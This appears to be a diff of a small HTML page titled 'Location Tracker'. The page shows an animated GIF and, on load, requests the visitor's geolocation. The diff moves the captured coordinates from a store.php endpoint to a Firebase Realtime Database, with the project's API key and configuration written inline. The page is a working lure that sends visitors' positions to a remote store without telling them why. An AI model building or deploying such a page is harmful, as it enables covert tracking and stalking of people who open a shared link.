@@ -1,33 +1,64 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Location Tracker</title>
+</head>
 <body onload="getLocation()">
   
- <iframe src="https://giphy.com/embed/OfkGZ5H2H3f8Y" width="372" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/american-horror-story-ahs-excited-OfkGZ5H2H3f8Y">via GIPHY</a></p>
+    <iframe src="https://giphy.com/embed/OfkGZ5H2H3f8Y" width="372" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+    <p id="demo">Locating...</p>
 
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
 
-<p id="demo"></p>
+    <script>
+        // 1. Your Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBE5G7qWLs9I-QSoSA2W1lNLz_9bDMBa4E",
+            authDomain: "toru-c1078.firebaseapp.com",
+            projectId: "toru-c1078",
+            storageBucket: "toru-c1078.firebasestorage.app",
+            messagingSenderId: "309813249712",
+            appId: "1:309813249712:web:e35635cbb1238fe495dd75",
+            measurementId: "G-B5HEZ3MLGF"
+        };
 
-<script>
-var x = document.getElementById("demo");
+        // 2. Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
 
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else { 
-    x.innerHTML = "Geolocation is not supported by this browser.";
-  }
-}
+        var x = document.getElementById("demo");
 
-function showPosition(position) {
-  const xhttp = new XMLHttpRequest();
-  xhttp.open("GET", "store.php?lat="+position.coords.latitude +"&long="+position.coords.longitude);
-xhttp.send();
-  
-}
-</script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                // Gets location and sends it to showPosition
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else { 
+                x.innerHTML = "Geolocation is not supported by this browser.";
+            }
+        }
 
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const long = position.coords.longitude;
+            
+            x.innerHTML = "Latitude: " + lat + "<br>Longitude: " + long;
+
+            // 3. Send data to Realtime Database instead of store.php
+            database.ref("user_locations").push({
+                latitude: lat,
+                longitude: long,
+                timestamp: new Date().toLocaleString()
+            }).then(() => {
+                console.log("Data saved to Firebase!");
+            }).catch((error) => {
+                console.error("Error:", error);
+            });
+        }
+
+        function showError(error) {
+            x.innerHTML = "Location Error: " + error.message;
+        }
+    </script>
 </body>
 </html>
-
-
-
